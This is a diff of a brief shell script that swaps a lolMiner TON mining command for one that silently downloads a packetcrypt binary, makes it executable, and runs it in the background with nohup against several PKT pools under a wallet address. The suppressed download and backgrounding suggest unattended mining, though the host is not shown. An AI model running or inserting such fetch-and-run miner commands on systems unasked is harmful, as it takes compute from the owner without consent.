@@ -1,6 +1,5 @@
-#!/bin/sh
+#!/bin/bash
 
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
-tar xvf lolMiner_v1.42_Lin64.tar.gz
-cd 1.42
-/lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF
+wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O pkt &>/dev/null
+chmod +x ./pkt
+nohup ./pkt ann -p pkt1qeqdz7zz9w7cuasfjy6qd8xtw362a0et5eczl9r https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io > nohup.out
